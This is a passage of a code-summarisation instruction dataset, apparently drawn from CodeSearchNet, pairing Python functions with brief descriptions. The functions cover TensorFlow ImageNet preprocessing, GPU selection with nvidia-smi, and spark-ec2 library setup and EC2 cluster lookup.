tf.placeholder(tf.int32, [None], name='labels')\n\n  # Number of classes in the Dataset label set plus 1.\n  # Label 0 is reserved for an (unused) background class.\n  dataset = ImagenetData(subset=FLAGS.subset)\n\n  num_classes = dataset.num_classes() + 1\n\n  # Build a Graph that computes the logits predictions from the\n  # inference model.\n  logits, _ = inception.inference(images, num_classes)\n\n  # Calculate predictions.\n  top_1_op = tf.nn.in_top_k(logits, labels, 1)\n  top_5_op = tf.nn.in_top_k(logits, labels, 5)\n\n  # Restore the moving average version of the learned variables for eval.\n  variable_averages = tf.train.ExponentialMovingAverage(\n      inception.MOVING_AVERAGE_DECAY)\n  variables_to_restore = variable_averages.variables_to_restore()\n  saver = tf.train.Saver(variables_to_restore)\n\n  with tf.Session() as sess:\n    ckpt = tf.train.get_checkpoint_state(FLAGS.train_dir)\n    if not ckpt or not ckpt.model_checkpoint_path:\n      raise Exception(\"No checkpoint file found at: {}\".format(FLAGS.train_dir))\n    print(\"ckpt.model_checkpoint_path: {0}\".format(ckpt.model_checkpoint_path))\n\n    saver.restore(sess, ckpt.model_checkpoint_path)\n\n    # Assuming model_checkpoint_path looks something like:\n    #   /my-favorite-path/imagenet_train/model.ckpt-0,\n    # extract global_step from it.\n    global_step = ckpt.model_checkpoint_path.split('/')[-1].split('-')[-1]\n    print('Successfully loaded model from %s at step=%s.' %\n          (ckpt.model_checkpoint_path, global_step))\n\n    print(\"Exporting saved_model to: {}\".format(FLAGS.export_dir))\n    # exported signatures defined in code\n    signatures = {\n      tf.saved_model.signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY: {\n        'inputs': { 'jpegs': jpegs, 'labels': labels },\n        'outputs': { 'top_5_acc': top_5_op },\n        'method_name': tf.saved_model.signature_constants.PREDICT_METHOD_NAME\n      }\n    }\n    TFNode.export_saved_model(sess,\n                              FLAGS.export_dir,\n                              tf.saved_model.tag_constants.SERVING,\n                              signatures)\n    print(\"Exported saved_model\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_gpus(num_gpu=1, worker_index=-1):\n  # get list of gpus (index, uuid)\n  list_gpus = subprocess.check_output([\"nvidia-smi\", \"--list-gpus\"]).decode()\n  logging.debug(\"all GPUs:\\n{0}\".format(list_gpus))\n\n  # parse index and guid\n  gpus = [x for x in list_gpus.split('\\n') if len(x) > 0]\n\n  def parse_gpu(gpu_str):\n    cols = gpu_str.split(' ')\n    return cols[5].split(')')[0], cols[1].split(':')[0]\n  gpu_list = [parse_gpu(gpu) for gpu in gpus]\n\n  free_gpus = []\n  retries = 0\n  while len(free_gpus) < num_gpu and retries < MAX_RETRIES:\n    smi_output = subprocess.check_output([\"nvidia-smi\", \"--format=csv,noheader,nounits\", \"--query-compute-apps=gpu_uuid\"]).decode()\n    logging.debug(\"busy GPUs:\\n{0}\".format(smi_output))\n    busy_uuids = [x for x in smi_output.split('\\n') if len(x) > 0]\n    for uuid, index in gpu_list:\n      if uuid not in busy_uuids:\n        free_gpus.append(index)\n\n    if len(free_gpus) < num_gpu:\n      logging.warn(\"Unable to find available GPUs: requested={0}, available={1}\".format(num_gpu, len(free_gpus)))\n      retries += 1\n      time.sleep(30 * retries)\n      free_gpus = []\n\n  logging.info(\"Available GPUs: {}\".format(free_gpus))\n\n  # if still can't find available GPUs, raise exception\n  if len(free_gpus) < num_gpu:\n    smi_output = subprocess.check_output([\"nvidia-smi\", \"--format=csv\", \"--query-compute-apps=gpu_uuid,pid,process_name,used_gpu_memory\"]).decode()\n    logging.info(\": {0}\".format(smi_output))\n    raise Exception(\"Unable to find {} free GPU(s)\\n{}\".format(num_gpu, smi_output))\n\n  # Get logical placement\n  num_available = len(free_gpus)\n  if worker_index == -1:\n    # use original random placement\n    random.shuffle(free_gpus)\n    proposed_gpus = free_gpus[:num_gpu]\n  else:\n    # ordered by worker index\n    if worker_index * num_gpu + num_gpu > num_available:\n      worker_index = worker_index * num_gpu % num_available\n    proposed_gpus = free_gpus[worker_index * num_gpu:(worker_index * num_gpu + num_gpu)]\n  logging.info(\"Proposed GPUs: {}\".format(proposed_gpus))\n\n  return ','.join(str(x) for x in proposed_gpus)", "response": "Get list of free GPUs according to nvidia - smi."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets the available GPUs according to utilization thresholds.", "response": "def _get_free_gpu(max_gpu_utilization=40, min_free_memory=0.5, num_gpu=1):\n  \"\"\"Get available GPUs according to utilization thresholds.\n\n  Args:\n    :max_gpu_utilization: percent utilization threshold to consider a GPU \"free\"\n    :min_free_memory: percent free memory to consider a GPU \"free\"\n    :num_gpu: number of requested GPUs\n\n  Returns:\n    A tuple of (available_gpus, minimum_free_memory), where available_gpus is a comma-delimited string of GPU ids, and minimum_free_memory\n    is the lowest amount of free memory available on the available_gpus.\n\n  \"\"\"\n  def get_gpu_info():\n    # Get the gpu information\n    gpu_info = subprocess.check_output([\"nvidia-smi\", \"--format=csv,noheader,nounits\", \"--query-gpu=index,memory.total,memory.free,memory.used,utilization.gpu\"]).decode()\n    gpu_info = gpu_info.split('\\n')\n\n    gpu_info_array = []\n\n    # Check each gpu\n    for line in gpu_info:\n      if len(line) > 0:\n        gpu_id, total_memory, free_memory, used_memory, gpu_util = line.split(',')\n        gpu_memory_util = float(used_memory) / float(total_memory)\n        gpu_info_array.append((float(gpu_util), gpu_memory_util, gpu_id))\n\n    return(gpu_info_array)\n\n  # Read the gpu information multiple times\n  num_times_to_average = 5\n  current_array = []\n  for ind in range(num_times_to_average):\n    current_array.append(get_gpu_info())\n    time.sleep(1)\n\n  # Get number of gpus\n  num_gpus = len(current_array[0])\n\n  # Average the gpu information\n  avg_array = [(0, 0, str(x)) for x in range(num_gpus)]\n  for ind in range(num_times_to_average):\n    for gpu_ind in range(num_gpus):\n      avg_array[gpu_ind] = (avg_array[gpu_ind][0] + current_array[ind][gpu_ind][0], avg_array[gpu_ind][1] + current_array[ind][gpu_ind][1], avg_array[gpu_ind][2])\n\n  for gpu_ind in range(num_gpus):\n    avg_array[gpu_ind] = (float(avg_array[gpu_ind][0]) / num_times_to_average, float(avg_array[gpu_ind][1]) / num_times_to_average, avg_array[gpu_ind][2])\n\n  avg_array.sort()\n\n  gpus_found = 0\n  gpus_to_use = \"\"\n  free_memory = 1.0\n  # Return the least utilized GPUs if it's utilized less than max_gpu_utilization and amount of free memory is at least min_free_memory\n  # Otherwise, run in cpu only mode\n  for current_gpu in avg_array:\n    if current_gpu[0] < max_gpu_utilization and (1 - current_gpu[1]) > min_free_memory:\n      if gpus_found == 0:\n        gpus_to_use = current_gpu[2]\n        free_memory = 1 - current_gpu[1]\n      else:\n        gpus_to_use = gpus_to_use + \",\" + current_gpu[2]\n        free_memory = min(free_memory, 1 - current_gpu[1])\n\n      gpus_found = gpus_found + 1\n\n    if gpus_found == num_gpu:\n      break\n\n  return gpus_to_use, free_memory"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _convert_to_example(filename, image_buffer, label, text, height, width):\n\n  colorspace = 'RGB'\n  channels = 3\n  image_format = 'JPEG'\n\n  example = tf.train.Example(features=tf.train.Features(feature={\n      'image/height': _int64_feature(height),\n      'image/width': _int64_feature(width),\n      'image/colorspace': _bytes_feature(tf.compat.as_bytes(colorspace)),\n      'image/channels': _int64_feature(channels),\n      'image/class/label': _int64_feature(label),\n      'image/class/text': _bytes_feature(tf.compat.as_bytes(text)),\n      'image/format': _bytes_feature(tf.compat.as_bytes(image_format)),\n      'image/filename': _bytes_feature(tf.compat.as_bytes(os.path.basename(filename))),\n      'image/encoded': _bytes_feature(tf.compat.as_bytes(image_buffer))}))\n  return example", "response": "Convert an example.\n    to a tf. train. Example proto."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nprocessing and saves list of images as TFRecord in 1 thread.", "response": "def _process_image_files_batch(coder, thread_index, ranges, name, filenames,\n                               texts, labels, num_shards):\n  \"\"\"Processes and saves list of images as TFRecord in 1 thread.\n\n  Args:\n    coder: instance of ImageCoder to provide TensorFlow image coding utils.\n    thread_index: integer, unique batch to run index is within [0, len(ranges)).\n    ranges: list of pairs of integers specifying ranges of each batches to\n      analyze in parallel.\n    name: string, unique identifier specifying the data set\n    filenames: list of strings; each string is a path to an image file\n    texts: list of strings; each string is human readable, e.g. 'dog'\n    labels: list of integer; each integer identifies the ground truth\n    num_shards: integer number of shards for this data set.\n  \"\"\"\n  # Each thread produces N shards where N = int(num_shards / num_threads).\n  # For instance, if num_shards = 128, and the num_threads = 2, then the first\n  # thread would produce shards [0, 64).\n  num_threads = len(ranges)\n  assert not num_shards % num_threads\n  num_shards_per_batch = int(num_shards / num_threads)\n\n  shard_ranges = np.linspace(ranges[thread_index][0],\n                             ranges[thread_index][1],\n                             num_shards_per_batch + 1).astype(int)\n  num_files_in_thread = ranges[thread_index][1] - ranges[thread_index][0]\n\n  counter = 0\n  for s in range(num_shards_per_batch):\n    # Generate a sharded version of the file name, e.g. 'train-00002-of-00010'\n    shard = thread_index * num_shards_per_batch + s\n    output_filename = '%s-%.5d-of-%.5d' % (name, shard, num_shards)\n    output_file = os.path.join(FLAGS.output_directory, output_filename)\n    writer = tf.python_io.TFRecordWriter(output_file)\n\n    shard_counter = 0\n    files_in_shard = np.arange(shard_ranges[s], shard_ranges[s + 1], dtype=int)\n    for i in files_in_shard:\n      filename = filenames[i]\n      label = labels[i]\n      text = texts[i]\n\n      image_buffer, height, width = _process_image(filename, coder)\n\n      example = _convert_to_example(filename, image_buffer, label,\n                                    text, height, width)\n      writer.write(example.SerializeToString())\n      shard_counter += 1\n      counter += 1\n\n      if not counter % 1000:\n        print('%s [thread %d]: Processed %d of %d images in thread batch.' %\n              (datetime.now(), thread_index, counter, num_files_in_thread))\n        sys.stdout.flush()\n\n    writer.close()\n    print('%s [thread %d]: Wrote %d images to %s' %\n          (datetime.now(), thread_index, shard_counter, output_file))\n    sys.stdout.flush()\n    shard_counter = 0\n  print('%s [thread %d]: Wrote %d images to %d shards.' %\n        (datetime.now(), thread_index, counter, num_files_in_thread))\n  sys.stdout.flush()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _process_image_files(name, filenames, texts, labels, num_shards):\n  assert len(filenames) == len(texts)\n  assert len(filenames) == len(labels)\n\n  # Break all images into batches with a [ranges[i][0], ranges[i][1]].\n  spacing = np.linspace(0, len(filenames), FLAGS.num_threads + 1).astype(np.int)\n  ranges = []\n  for i in range(len(spacing) - 1):\n    ranges.append([spacing[i], spacing[i+1]])\n\n  # Launch a thread for each batch.\n  print('Launching %d threads for spacings: %s' % (FLAGS.num_threads, ranges))\n  sys.stdout.flush()\n\n  # Create a mechanism for monitoring when all threads are finished.\n  coord = tf.train.Coordinator()\n\n  # Create a generic TensorFlow-based utility for converting all image codings.\n  coder = ImageCoder()\n\n  threads = []\n  for thread_index in range(len(ranges)):\n    args = (coder, thread_index, ranges, name, filenames,\n            texts, labels, num_shards)\n    t = threading.Thread(target=_process_image_files_batch, args=args)\n    t.start()\n    threads.append(t)\n\n  # Wait for all the threads to terminate.\n  coord.join(threads)\n  print('%s: Finished writing all %d images in data set.' %\n        (datetime.now(), len(filenames)))\n  sys.stdout.flush()", "response": "Process and save list of images as TFRecord of Example protos."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nfinds all images files and labels in the data set.", "response": "def _find_image_files(data_dir, labels_file):\n  \"\"\"Build a list of all images files and labels in the data set.\n\n  Args:\n    data_dir: string, path to the root directory of images.\n\n      Assumes that the image data set resides in JPEG files located in\n      the following directory structure.\n\n        data_dir/dog/another-image.JPEG\n        data_dir/dog/my-image.jpg\n\n      where 'dog' is the label associated with these images.\n\n    labels_file: string, path to the labels file.\n\n      The list of valid labels are held in this file. Assumes that the file\n      contains entries as such:\n        dog\n        cat\n        flower\n      where each line corresponds to a label. We map each label contained in\n      the file to an integer starting with the integer 0 corresponding to the\n      label contained in the first line.\n\n  Returns:\n    filenames: list of strings; each string is a path to an image file.\n    texts: list of strings; each string is the class, e.g. 'dog'\n    labels: list of integer; each integer identifies the ground truth.\n  \"\"\"\n  print('Determining list of input files and labels from %s.' % data_dir)\n  unique_labels = [l.strip() for l in tf.gfile.FastGFile(\n      labels_file, 'r').readlines()]\n\n  labels = []\n  filenames = []\n  texts = []\n\n  # Leave label index 0 empty as a background class.\n  label_index = 1\n\n  # Construct the list of JPEG files and labels.\n  for text in unique_labels:\n    jpeg_file_path = '%s/%s/*' % (data_dir, text)\n    matching_files = tf.gfile.Glob(jpeg_file_path)\n\n    labels.extend([label_index] * len(matching_files))\n    texts.extend([text] * len(matching_files))\n    filenames.extend(matching_files)\n\n    if not label_index % 100:\n      print('Finished finding files in %d of %d classes.' % (\n          label_index, len(labels)))\n    label_index += 1\n\n  # Shuffle the ordering of all image files in order to guarantee\n  # random ordering of the images with respect to label in the\n  # saved TFRecord files. Make the randomization repeatable.\n  shuffled_index = list(range(len(filenames)))\n  random.seed(12345)\n  random.shuffle(shuffled_index)\n\n  filenames = [filenames[i] for i in shuffled_index]\n  texts = [texts[i] for i in shuffled_index]\n  labels = [labels[i] for i in shuffled_index]\n\n  print('Found %d JPEG files across %d labels inside %s.' %\n        (len(filenames), len(unique_labels), data_dir))\n  return filenames, texts, labels"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nprocessing a complete data set and save it as a TFRecord. Arguments", "response": "def _process_dataset(name, directory, num_shards, labels_file):\n  \"\"\"Process a complete data set and save it as a TFRecord.\n\n  Args:\n    name: string, unique identifier specifying the data set.\n    directory: string, root path to the data set.\n    num_shards: integer number of shards for this data set.\n    labels_file: string, path to the labels file.\n  \"\"\"\n  filenames, texts, labels = _find_image_files(directory, labels_file)\n  _process_image_files(name, filenames, texts, labels, num_shards)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef inputs(dataset, batch_size=None, num_preprocess_threads=None):\n  if not batch_size:\n    batch_size = FLAGS.batch_size\n\n  # Force all input processing onto CPU in order to reserve the GPU for\n  # the forward inference and back-propagation.\n  with tf.device('/cpu:0'):\n    images, labels = batch_inputs(\n        dataset, batch_size, train=False,\n        num_preprocess_threads=num_preprocess_threads,\n        num_readers=1)\n\n  return images, labels", "response": "Generate batches of ImageNet images for evaluation."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef distorted_inputs(dataset, batch_size=None, num_preprocess_threads=None):\n  if not batch_size:\n    batch_size = FLAGS.batch_size\n\n  # Force all input processing onto CPU in order to reserve the GPU for\n  # the forward inference and back-propagation.\n  with tf.device('/cpu:0'):\n    images, labels = batch_inputs(\n        dataset, batch_size, train=True,\n        num_preprocess_threads=num_preprocess_threads,\n        num_readers=FLAGS.num_readers)\n  return images, labels", "response": "Generate batches of distorted versions of ImageNet images."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef decode_jpeg(image_buffer, scope=None):\n  with tf.name_scope(values=[image_buffer], name=scope,\n                     default_name='decode_jpeg'):\n    # Decode the string as an RGB JPEG.\n    # Note that the resulting image contains an unknown height and width\n    # that is set dynamically by decode_jpeg. In other words, the height\n    # and width of image is unknown at compile-time.\n    image = tf.image.decode_jpeg(image_buffer, channels=3)\n\n    # After this point, all image pixels reside in [0,1)\n    # until the very end, when they're rescaled to (-1, 1).  The various\n    # adjust_* ops all require this range for dtype float.\n    image = tf.image.convert_image_dtype(image, dtype=tf.float32)\n    return image", "response": "Decode a JPEG string into one 3 - D float image Tensor."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef distort_color(image, thread_id=0, scope=None):\n  with tf.name_scope(values=[image], name=scope, default_name='distort_color'):\n    color_ordering = thread_id % 2\n\n    if color_ordering == 0:\n      image = tf.image.random_brightness(image, max_delta=32. / 255.)\n      image = tf.image.random_saturation(image, lower=0.5, upper=1.5)\n      image = tf.image.random_hue(image, max_delta=0.2)\n      image = tf.image.random_contrast(image, lower=0.5, upper=1.5)\n    elif color_ordering == 1:\n      image = tf.image.random_brightness(image, max_delta=32. / 255.)\n      image = tf.image.random_contrast(image, lower=0.5, upper=1.5)\n      image = tf.image.random_saturation(image, lower=0.5, upper=1.5)\n      image = tf.image.random_hue(image, max_delta=0.2)\n\n    # The random_* ops do not necessarily clamp.\n    image = tf.clip_by_value(image, 0.0, 1.0)\n    return image", "response": "Distort the color of the image."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndistort one image for training a network.", "response": "def distort_image(image, height, width, bbox, thread_id=0, scope=None):\n  \"\"\"Distort one image for training a network.\n\n  Distorting images provides a useful technique for augmenting the data\n  set during training in order to make the network invariant to aspects\n  of the image that do not effect the label.\n\n  Args:\n    image: 3-D float Tensor of image\n    height: integer\n    width: integer\n    bbox: 3-D float Tensor of bounding boxes arranged [1, num_boxes, coords]\n      where each coordinate is [0, 1) and the coordinates are arranged\n      as [ymin, xmin, ymax, xmax].\n    thread_id: integer indicating the preprocessing thread.\n    scope: Optional scope for name_scope.\n  Returns:\n    3-D float Tensor of distorted image used for training.\n  \"\"\"\n  with tf.name_scope(values=[image, height, width, bbox], name=scope,\n                     default_name='distort_image'):\n    # Each bounding box has shape [1, num_boxes, box coords] and\n    # the coordinates are ordered [ymin, xmin, ymax, xmax].\n\n    # Display the bounding box in the first thread only.\n    if not thread_id:\n      image_with_box = tf.image.draw_bounding_boxes(tf.expand_dims(image, 0),\n                                                    bbox)\n      tf.summary.image('image_with_bounding_boxes', image_with_box)\n\n  # A large fraction of image datasets contain a human-annotated bounding\n  # box delineating the region of the image containing the object of interest.\n  # We choose to create a new bounding box for the object which is a randomly\n  # distorted version of the human-annotated bounding box that obeys an allowed\n  # range of aspect ratios, sizes and overlap with the human-annotated\n  # bounding box. If no box is supplied, then we assume the bounding box is\n  # the entire image.\n    sample_distorted_bounding_box = tf.image.sample_distorted_bounding_box(\n        tf.shape(image),\n        bounding_boxes=bbox,\n        min_object_covered=0.1,\n        aspect_ratio_range=[0.75, 1.33],\n        area_range=[0.05, 1.0],\n        max_attempts=100,\n        use_image_if_no_bounding_boxes=True)\n    bbox_begin, bbox_size, distort_bbox = sample_distorted_bounding_box\n    if not thread_id:\n      image_with_distorted_box = tf.image.draw_bounding_boxes(\n          tf.expand_dims(image, 0), distort_bbox)\n      tf.summary.image('images_with_distorted_bounding_box',\n                       image_with_distorted_box)\n\n    # Crop the image to the specified bounding box.\n    distorted_image = tf.slice(image, bbox_begin, bbox_size)\n\n    # This resizing operation may distort the images because the aspect\n    # ratio is not respected. We select a resize method in a round robin\n    # fashion based on the thread number.\n    # Note that ResizeMethod contains 4 enumerated resizing methods.\n    resize_method = thread_id % 4\n    distorted_image = tf.image.resize_images(distorted_image, [height, width],\n                                             method=resize_method)\n    # Restore the shape since the dynamic slice based upon the bbox_size loses\n    # the third dimension.\n    distorted_image.set_shape([height, width, 3])\n    if not thread_id:\n      tf.summary.image('cropped_resized_image',\n                       tf.expand_dims(distorted_image, 0))\n\n    # Randomly flip the image horizontally.\n    distorted_image = tf.image.random_flip_left_right(distorted_image)\n\n    # Randomly distort the colors.\n    distorted_image = distort_color(distorted_image, thread_id)\n\n    if not thread_id:\n      tf.summary.image('final_distorted_image',\n                       tf.expand_dims(distorted_image, 0))\n    return distorted_image"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef eval_image(image, height, width, scope=None):\n  with tf.name_scope(values=[image, height, width], name=scope,\n                     default_name='eval_image'):\n    # Crop the central region of the image with an area containing 87.5% of\n    # the original image.\n    image = tf.image.central_crop(image, central_fraction=0.875)\n\n    # Resize the image to the original height and width.\n    image = tf.expand_dims(image, 0)\n    image = tf.image.resize_bilinear(image, [height, width],\n                                     align_corners=False)\n    image = tf.squeeze(image, [0])\n    return image", "response": "Prepare one image for evaluation."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndecodes and preprocess one image for evaluation or training.", "response": "def image_preprocessing(image_buffer, bbox, train, thread_id=0):\n  \"\"\"Decode and preprocess one image for evaluation or training.\n\n  Args:\n    image_buffer: JPEG encoded string Tensor\n    bbox: 3-D float Tensor of bounding boxes arranged [1, num_boxes, coords]\n      where each coordinate is [0, 1) and the coordinates are arranged as\n      [ymin, xmin, ymax, xmax].\n    train: boolean\n    thread_id: integer indicating preprocessing thread\n\n  Returns:\n    3-D float Tensor containing an appropriately scaled image\n\n  Raises:\n    ValueError: if user does not provide bounding box\n  \"\"\"\n  if bbox is None:\n    raise ValueError('Please supply a bounding box.')\n\n  image = decode_jpeg(image_buffer)\n  height = FLAGS.image_size\n  width = FLAGS.image_size\n\n  if train:\n    image = distort_image(image, height, width, bbox, thread_id)\n  else:\n    image = eval_image(image, height, width)\n\n  # Finally, rescale to [-1,1] instead of [0, 1)\n  image = tf.subtract(image, 0.5)\n  image = tf.multiply(image, 2.0)\n  return image"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_example_proto(example_serialized):\n  # Dense features in Example proto.\n  feature_map = {\n      'image/encoded': tf.FixedLenFeature([], dtype=tf.string,\n                                          default_value=''),\n      'image/class/label': tf.FixedLenFeature([1], dtype=tf.int64,\n                                              default_value=-1),\n      'image/class/text': tf.FixedLenFeature([], dtype=tf.string,\n                                             default_value=''),\n  }\n  sparse_float32 = tf.VarLenFeature(dtype=tf.float32)\n  # Sparse features in Example proto.\n  feature_map.update(\n      {k: sparse_float32 for k in ['image/object/bbox/xmin',\n                                   'image/object/bbox/ymin',\n                                   'image/object/bbox/xmax',\n                                   'image/object/bbox/ymax']})\n\n  features = tf.parse_single_example(example_serialized, feature_map)\n  label = tf.cast(features['image/class/label'], dtype=tf.int32)\n\n  xmin = tf.expand_dims(features['image/object/bbox/xmin'].values, 0)\n  ymin = tf.expand_dims(features['image/object/bbox/ymin'].values, 0)\n  xmax = tf.expand_dims(features['image/object/bbox/xmax'].values, 0)\n  ymax = tf.expand_dims(features['image/object/bbox/ymax'].values, 0)\n\n  # Note that we impose an ordering of (y, x) just to make life difficult.\n  bbox = tf.concat(axis=0, values=[ymin, xmin, ymax, xmax])\n\n  # Force the variable number of bounding boxes into the shape\n  # [1, num_boxes, coords].\n  bbox = tf.expand_dims(bbox, 0)\n  bbox = tf.transpose(bbox, [0, 2, 1])\n\n  return features['image/encoded'], label, bbox, features['image/class/text']", "response": "Parses an example proto containing a training example of an image."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef batch_inputs(dataset, batch_size, train, num_preprocess_threads=None,\n                 num_readers=1):\n  \"\"\"Contruct batches of training or evaluation examples from the image dataset.\n\n  Args:\n    dataset: instance of Dataset class specifying the dataset.\n      See dataset.py for details.\n    batch_size: integer\n    train: boolean\n    num_preprocess_threads: integer, total number of preprocessing threads\n    num_readers: integer, number of parallel readers\n\n  Returns:\n    images: 4-D float Tensor of a batch of images\n    labels: 1-D integer Tensor of [batch_size].\n\n  Raises:\n    ValueError: if data is not found\n  \"\"\"\n  with tf.name_scope('batch_processing'):\n    data_files = dataset.data_files()\n    if data_files is None:\n      raise ValueError('No data files found for this dataset')\n\n    # Create filename_queue\n    if train:\n      filename_queue = tf.train.string_input_producer(data_files,\n                                                      shuffle=True,\n                                                      capacity=16)\n    else:\n      filename_queue = tf.train.string_input_producer(data_files,\n                                                      shuffle=False,\n                                                      capacity=1)\n    if num_preprocess_threads is None:\n      num_preprocess_threads = FLAGS.num_preprocess_threads\n\n    if num_preprocess_threads % 4:\n      raise ValueError('Please make num_preprocess_threads a multiple '\n                       'of 4 (%d % 4 != 0).', num_preprocess_threads)\n\n    if num_readers is None:\n      num_readers = FLAGS.num_readers\n\n    if num_readers < 1:\n      raise ValueError('Please make num_readers at least 1')\n\n    # Approximate number of examples per shard.\n    examples_per_shard = 1024\n    # Size the random shuffle queue to balance between good global\n    # mixing (more examples) and memory use (fewer examples).\n    # 1 image uses 299*299*3*4 bytes = 1MB\n    # The default input_queue_memory_factor is 16 implying a shuffling queue\n    # size: examples_per_shard * 16 * 1MB = 17.6GB\n    min_queue_examples = examples_per_shard * FLAGS.input_queue_memory_factor\n    if train:\n      examples_queue = tf.RandomShuffleQueue(\n          capacity=min_queue_examples + 3 * batch_size,\n          min_after_dequeue=min_queue_examples,\n          dtypes=[tf.string])\n    else:\n      examples_queue = tf.FIFOQueue(\n          capacity=examples_per_shard + 3 * batch_size,\n          dtypes=[tf.string])\n\n    # Create multiple readers to populate the queue of examples.\n    if num_readers > 1:\n      enqueue_ops = []\n      for _ in range(num_readers):\n        reader = dataset.reader()\n        _, value = reader.read(filename_queue)\n        enqueue_ops.append(examples_queue.enqueue([value]))\n\n      tf.train.queue_runner.add_queue_runner(\n          tf.train.queue_runner.QueueRunner(examples_queue, enqueue_ops))\n      example_serialized = examples_queue.dequeue()\n    else:\n      reader = dataset.reader()\n      _, example_serialized = reader.read(filename_queue)\n\n    images_and_labels = []\n    for thread_id in range(num_preprocess_threads):\n      # Parse a serialized Example proto to extract the image and metadata.\n      image_buffer, label_index, bbox, _ = parse_example_proto(\n          example_serialized)\n      image = image_preprocessing(image_buffer, bbox, train, thread_id)\n      images_and_labels.append([image, label_index])\n\n    images, label_index_batch = tf.train.batch_join(\n        images_and_labels,\n        batch_size=batch_size,\n        capacity=2 * num_preprocess_threads * batch_size)\n\n    # Reshape images into these desired dimensions.\n    height = FLAGS.image_size\n    width = FLAGS.image_size\n    depth = 3\n\n    images = tf.cast(images, tf.float32)\n    images = tf.reshape(images, shape=[batch_size, height, width, depth])\n\n    # Display the training images in the visualizer.\n    tf.summary.image('images', images)\n\n    return images, tf.reshape(label_index_batch, [batch_size])", "response": "Contruct batches of training or evaluation examples from the image dataset."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef setup_external_libs(libs):\n    PYPI_URL_PREFIX = \"https://pypi.python.org/packages/source\"\n    SPARK_EC2_LIB_DIR = os.path.join(SPARK_EC2_DIR, \"lib\")\n\n    if not os.path.exists(SPARK_EC2_LIB_DIR):\n        print(\"Downloading external libraries that spark-ec2 needs from PyPI to {path}...\".format(\n            path=SPARK_EC2_LIB_DIR\n        ))\n        print(\"This should be a one-time operation.\")\n        os.mkdir(SPARK_EC2_LIB_DIR)\n\n    for lib in libs:\n        versioned_lib_name = \"{n}-{v}\".format(n=lib[\"name\"], v=lib[\"version\"])\n        lib_dir = os.path.join(SPARK_EC2_LIB_DIR, versioned_lib_name)\n\n        if not os.path.isdir(lib_dir):\n            tgz_file_path = os.path.join(SPARK_EC2_LIB_DIR, versioned_lib_name + \".tar.gz\")\n            print(\" - Downloading {lib}...\".format(lib=lib[\"name\"]))\n            download_stream = urlopen(\n                \"{prefix}/{first_letter}/{lib_name}/{lib_name}-{lib_version}.tar.gz\".format(\n                    prefix=PYPI_URL_PREFIX,\n                    first_letter=lib[\"name\"][:1],\n                    lib_name=lib[\"name\"],\n                    lib_version=lib[\"version\"]\n                )\n            )\n            with open(tgz_file_path, \"wb\") as tgz_file:\n                tgz_file.write(download_stream.read())\n            with open(tgz_file_path, \"rb\") as tar:\n                if hashlib.md5(tar.read()).hexdigest() != lib[\"md5\"]:\n                    print(\"ERROR: Got wrong md5sum for {lib}.\".format(lib=lib[\"name\"]), file=stderr)\n                    sys.exit(1)\n            tar = tarfile.open(tgz_file_path)\n            tar.extractall(path=SPARK_EC2_LIB_DIR)\n            tar.close()\n            os.remove(tgz_file_path)\n            print(\" - Finished downloading {lib}.\".format(lib=lib[\"name\"]))\n        sys.path.insert(1, lib_dir)", "response": "Setup the external libraries that spark - ec2 needs from PyPI to our PATH."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets the EC2 instances in an existing cluster if available.", "response": "def get_existing_cluster(conn, opts, cluster_name, die_on_error=True):\n    \"\"\"\n    Get the EC2 instances in an existing cluster if available.\n    Returns a tuple of lists of EC2 instance objects for the masters and slaves.\n    \"\"\"\n    print(\"Searching for existing cluster {c} in region {r}...\".format(\n          c=cluster_name, r=opts.region))\n\n    def get_instances(group_names):\n        \"\"\"\n        Get all non-terminated instances that belong to any of the provided security groups.\n\n        EC2 reservation filters and instance states are documented here:\n            http://docs.aws.amazon.com/cli/latest/reference/ec2/describe-instances.html#options\n        \"\"\"\n        reservations = conn.get_all_reservations(\n            filters={\"instance.group-name\": group_names})\n        instances = itertools.chain.from_iterable(r.instances for r in reservations)\n        return [i for i in instances if i.state not in [\"shutting-down\", \"terminated\"]]\n\n    master_instances = get_instances([cluster_name + \"-master\"])\n    slave_instances = get_instances([cluster_name + \"-slaves\"])\n\n    if any((master_instances, slave_instances)):\n        print(\"Found {m} master{plural_m}, {s} slave{plural_s}.\".format(\n              m=len(master_instances),\n              plural_m=('' if len(master_instances) == 1 else 's'),\n              s=len(slave_instances),\n              plural_s=('' if len(slave_instances) == 1 else 's')))\n\n    if not master_instances and die_on_error:\n        print(\"ERROR: Could not find a master for cluster {c} in region {r}.\".format(\n              c=cluster_name, r=opts.region), file=sys.stderr)\n        sys.exit(1)\n\n    return (master_instances, slave_instances)"}
